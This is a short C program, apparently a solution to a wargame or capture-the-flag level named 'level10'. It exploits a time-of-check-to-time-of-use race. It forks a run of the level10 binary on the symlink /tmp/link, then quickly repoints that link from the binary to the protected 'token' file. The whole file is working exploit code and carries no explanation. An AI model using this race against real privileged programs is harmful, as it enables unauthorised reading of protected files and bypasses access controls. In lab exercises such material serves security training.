#include <unistd.h>

int main(void)
{
	remove("/tmp/link");
	symlink("/home/user/level10/level10", "/tmp/link");

	int ffd = fork();

	if (ffd == 0)
		execl("/home/user/level10/level10", "level10", "/tmp/link", "/tmp/link", NULL);
	else
	{
		usleep(1);
		remove("/tmp/link");
		symlink("/home/user/level10/token", "/tmp/link");
	}

	return (0);
}